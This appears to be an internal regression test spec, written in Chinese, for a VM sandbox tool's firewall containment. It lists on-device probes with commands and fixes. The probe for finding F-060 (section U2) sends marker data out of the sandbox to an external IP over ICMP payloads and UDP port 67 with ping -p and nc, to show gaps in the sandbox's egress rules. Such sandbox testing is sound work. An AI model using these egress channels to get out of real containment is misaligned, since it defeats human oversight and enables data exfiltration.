# r13-regression — R13 产出：Ubuntu 侧实机探针规格（全部待 Linux 实机）

本文件只写规格，不写实现（本机 macOS 编不了 Linux-gated 代码）。每条探针给
出：前置、精确命令、期望、实际判定、对应 finding。判绿纪律：`cmd > log 2>&1; RC=$?`
存 RC 不过管道；zsh 无 PIPESTATUS（Ubuntu 侧用 bash）。

## U1 — F-059：guest reboot 后 containment 静默蒸发

**假设**：iptables 规则只活在内核 RAM；lockdown 写的 `/etc/iptables/rules.v4`
在 Ubuntu 24.04（netplan、无 netfilter-persistent、无 ifupdown）上无消费者；
cloud-init runcmd 是 per-instance（instance-id 冻结在 instance.json，`up`
不重建 seed）→ qemu 进程死亡 + `creance up` 恢复后 OUTPUT 策略回到 ACCEPT。

**前置**：Ubuntu 24.04 实机，`creance setup && creance up` 完成；记下实例目录。

```bash
# 1) 基线：lockdown 在位
creance shell bash -c 'iptables -S OUTPUT > /tmp/u1-before.txt 2>&1; iptables -L OUTPUT -n >> /tmp/u1-before.txt'
# 期望：Policy DROP + 四条 ALLOW（lo/ESTABLISHED,RELATED/udp 67/icmp）
# 2) 验证 rules.v4 无消费者（静态证据补强）
creance shell bash -c 'dpkg -l | grep -E "iptables-persistent|netfilter-persistent|ifupdown" || echo NO-RESTORE-PKG'
# 期望：NO-RESTORE-PKG（若无输出行则打印标记）
# 3) guest 内重启（无需 sudo 的路径不可用，走宿主侧 qemu 死亡恢复路径）
#    宿主：SIGKILL qemu 进程（模拟 OOM/crash）
pkill -KILL -f "qemu-system.*$(creance list ... 实例名)"   # 以 runner.rs 实际 argv 为准
creance up      # 期望：绿（复用冻结 instance.json，cloud-init 因 instance-id 相同跳过 runcmd）
# 4) 复查防火墙
creance shell bash -c 'iptables -S OUTPUT'
# 期望（若洞成立）：Policy ACCEPT，且 net-direct-egress 手动 escape-test 报 ESCAPE
# 5) 对照：cloud-init 日志确认本次 boot 未重跑 runcmd
creance shell bash -c 'grep -c iptables /var/log/cloud-init-output.log'
```

**判定**：步骤 4 若 ACCEPT → F-059 成立（S2）。修复方向：lockdown 落
netfilter-persistent 包安装 + `netfilter-persistent reload`；或 cloud-init
`bootcmd`（每 boot 重放）写规则；或 up() 对存量实例做 OUTPUT 策略验证。

## U2 — F-060：后 lockdown 出网通道（ICMP 载荷 / UDP dport 67）

**假设**：lockdown 四条 ALLOW 里 `-p icmp` 与 `-p udp --dport 67` 均无
`-d` 目的限定 → guest 非特权用户可 (a) `ping -p` 载荷外传（ping 带
cap_net_raw）、(b) UDP 任意目的 67 端口外传（slirp NAT 不按 dport 过滤出站）。

```bash
# (a) ICMP：从 guest 对外部主机发 ping，载荷携标记
creance shell bash -c 'ping -c 3 -p 6436366f6e 93.184.216.34 > /tmp/u2a.log 2>&1; RC=$?; echo RC=$RC; cat /tmp/u2a.log'
# 期望（洞成立）：RC=0，宿主 tcpdump -i any icmp 可见 echo 载荷 "dccon"
# （对照：UDP 443/80 TCP 的 curl 被丢弃 —— net-direct-egress 已强制面）
# (b) UDP 67：guest 内
creance shell bash -c 'echo marker-u2b | nc -u -w 2 93.184.216.34 67 > /tmp/u2b.log 2>&1; RC=$?; echo RC=$RC'
# 宿主：sudo tcpdump -i any udp port 67 and host 93.184.216.34
# 期望（洞成立）：出站 UDP/67 包经 slirp NAT 到达宿主上行
```

**判定**：任一通道出站可见 → F-060 成立。修复方向：`-p udp --dport 67` 加
`-d 10.0.2.2/32`（或 255.255.255.255）；icmp 限 `-d 10.0.2.2/32 --icmp-type echo`
或直接删（若供给期 DHCP 用不到 guest 侧 ping）。

## U3 — F-057 验证：orphan core 在 systemd user session 下 ppid≠1

**假设**：systemd user manager 设 PR_SET_CHILD_SUBREAPER；relay 死后核心
re-parent 到 user manager（pid≠1）→ `reap_orphan_cores` 的 ppid==1 判定恒假，
收割网在 Linux 主战场静默失效。

```bash
# 1) 确认 user manager 是 subreaper
systemctl --user show -p Names 2>/dev/null; grep Subreaper /proc/$(pgrep -x systemd --ns $$/head -1)/status 2>/dev/null || \
  cat /proc/<systemd --user pid>/status | grep -i subreaper   # 期望 tGID 对应进程 NSpid... Subreaper: 1
# 2) 构造孤儿：起 creance proxy（Linux 路径），kill -9 relay pid（core.pid 记录者）
kill -KILL $(cat <profile>/proxy/core.pid)
sleep 2
ps -o pid,ppid,cmd -p $(pgrep -f "<proxy-dir>/mihomo -d")
# 期望（洞成立）：mihomo 的 PPID = systemd --user 的 pid（如 1234），不是 1
# 3) 跑 creance proxy-stop，观察 pgrep 签名命中但 ppid≠1 → 未收割
creance proxy-stop && ps -o pid,ppid -p <mihomo pid>   # 期望（洞成立）：mihomo 仍存活
```

**判定**：ppid==systemd-user-pid 且 stop 后仍存活 → F-057 Linux 主战场成立。
修复方向：ppid 判定改为「parent 非 relay 且非本 creance 进程树」或比对
`/proc/<pid>/stat` 的 ppid∈{1, systemd-user-pid}，或以控制 socket 活性为收割判据。

## U4 — GNU gunzip 尾部垃圾退出码（fetch-proxy-core override 路径，Linux 分支）

```bash
printf 'X' > p && gzip -c p > c.gz && cp c.gz d.gz && printf 'JUNK' >> d.gz
gunzip -c d.gz > o 2>e; RC=$?
# 期望（GNU gzip 文档）：RC=2 + "trailing garbage ignored" → set -e + && 链 fail-closed
# 若 RC=0（旧 GNU 行为）→ override 路径带垃圾包仍可 mv 成功——影响仅 override（无哈希）路径，钉版路径哈希盖全文件不受影响
```

## U5 — 供给期窗口宽度量化（H1 分析配套，非独立 finding）

```bash
# 目标：测 first boot 中「NAT 全开→OUTPUT DROP 落地」的实际秒数
creance shell bash -c 'stat -c %Y /etc/iptables/rules.v4'     # lockdown 落地时刻
# 对照：cloud-init 各阶段时间戳（/var/log/cloud-init-output.log 的 toolchain start/end）
# 期望：窗口 ≈ toolchain 预算上限（300s）+ apt 实际耗时；期间 guest 可直达 10.0.2.2（宿主回环）与外网
# 窗口内攻击面备忘：root 未退役 + NAT 全开 —— 敌意网络 MITM 可在窗口内植根（F-054 契约段只防"跳过"，不防"窗口内被攻破"）
```

## 交叉引用

- F-056（ERE）/F-058（探针腐烂）已在 macOS 实机完成，不依赖本文件。
- H2–H7 静态结论见 R13 STATE（STATE-r13.md）；U 系列跑完后逐条回填。
